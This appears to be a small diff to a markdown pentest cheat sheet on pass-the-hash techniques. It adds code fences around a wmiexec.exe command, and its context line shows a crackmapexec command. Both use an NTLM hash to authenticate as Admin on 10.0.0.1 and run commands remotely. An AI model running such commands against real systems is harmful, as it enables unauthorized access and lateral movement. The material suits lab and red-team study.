@@ -156,4 +156,6 @@ crackmapexec smb 10.0.0.1 -u Admin -H 32196B56FFE6F45E294117B91A83BF38 -x ipconf
 ```
 
 ##### ➤  wmiexec.exe
+```
 wmiexec.exe -hashes 00000000000000000000000000000000:32196B56FFE6F45E294117B91A83BF38 ignite/Admin@10.0.0.1
+```
